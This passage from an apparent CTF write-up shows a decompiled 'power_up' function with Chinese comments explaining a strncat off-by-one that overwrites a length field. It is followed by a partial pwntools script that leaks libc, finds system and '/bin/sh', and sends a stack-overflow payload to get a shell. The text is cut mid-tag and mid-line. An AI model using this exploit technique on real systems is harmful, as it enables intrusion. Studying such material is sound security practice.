<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl power_up(char *dest)</span><br><span class="line">&#123;</span><br><span class="line">  char s; &#x2F;&#x2F; [esp+0h] [ebp-34h]</span><br><span class="line">  size_t new_len; &#x2F;&#x2F; [esp+30h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  new_len &#x3D; 0;</span><br><span class="line">  memset(&amp;s, 0, 0x30u);</span><br><span class="line">  if ( !*dest )</span><br><span class="line">    return puts(&quot;You need create the bullet first !&quot;);</span><br><span class="line">  if ( *((_DWORD *)dest + 12) &gt; 47u )           &#x2F;&#x2F; len&gt;47</span><br><span class="line">    return puts(&quot;You can&#39;t power up any more !&quot;);</span><br><span class="line">  printf(&quot;Give me your another description of bullet :&quot;);</span><br><span class="line">  read_input(&amp;s, 48 - *((_DWORD *)dest + 12));</span><br><span class="line">  strncat(dest, &amp;s, 48 - *((_DWORD *)dest + 12));&#x2F;&#x2F; strncat会在dest结尾添加\0结束符，而记录字符串长度的位置正好位于s+0x30的位置，</span><br><span class="line">                                                &#x2F;&#x2F; s+0x30在strncat添加字符串长度为0x30时会被覆盖为0</span><br><span class="line">  new_len &#x3D; strlen(&amp;s) + *((_DWORD *)dest + 12);&#x2F;&#x2F; s+0x30被覆盖为0后new_len变为附加字符串的长度</span><br><span class="line">  printf(&quot;Your new power is : %u\n&quot;, new_len);</span><br><span class="line">  *((_DWORD *)dest + 12) &#x3D; new_len;</span><br><span class="line">  return puts(&quot;Enjoy it !&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

ss="line">r.send(payload)</span><br><span class="line">r.recvuntil(&#39;Your choice :&#39;)</span><br><span class="line">r.sendline(&#39;3&#39;)</span><br><span class="line">r.recvuntil(&#39;Oh ! You win !!\n&#39;)</span><br><span class="line">libc_base&#x3D;u32(r.recv(4))-libc.sym[&#39;puts&#39;]</span><br><span class="line">success(&#39;libc_base:&#39;+hex(libc_base))</span><br><span class="line">sys_addr&#x3D;libc_base+libc.sym[&#39;system&#39;]</span><br><span class="line">binsh_addr&#x3D;libc_base+libc.search(&#39;&#x2F;bin&#x2F;sh&#39;).next()</span><br><span class="line">success(&#39;binsh_addr&#39;+hex(binsh_addr))</span><br><span class="line">#gdb.attach(r)</span><br><span class="line"></span><br><span class="line">#trigger stack overflow again</span><br><span class="line">r.recvuntil(&#39;Your choice :&#39;)</span><br><span class="line">r.sendline(&#39;1&#39;)</span><br><span class="line">r.recvuntil(&#39;Give me your description of bullet :&#39;)</span><br><span class="line">r.send(&#39;a&#39;*47)</span><br><span class="line">r.sendline(&#39;2&#39;)</span><br><span class="line">r.recvuntil(&#39;Give me your another description of bullet :&#39;)</span><br><span class="line">r.send(&#39;b&#39;)</span><br><span class="line"></span><br><span class="line">#trigger system(&#39;&#x2F;bin&#x2F;sh&#39;) call</span><br><span class="line">r.recvuntil(&#39;Your choice :&#39;)</span><br><span class="line">r.sendline(&#39;2&#39;)</span><br><span class="line">r.recvuntil(&#39;Give me your another description of bullet :&#39;)</span><br><span class="line">payload1&#x3D;&#39;\xff&#39;*3+p32(0xdeadbeaf)+p32(sys_addr)+p32(0xdeadbeaf)+p32(binsh_addr)</span><br><span class="line">payload1+&#x3D;(47-len(payload))*&#39;a&#39;</span><br><span class="line">r.send(payload1)</span><br><span class="line">r.recvuntil(&#39;Your choice :&#39;)</span><br><span class="line">r.sendline(&#39;3&#39;)</span><br><span class="line">r.recvuntil(&#39;Oh ! You win !!\n&#39;)</span><br><span class
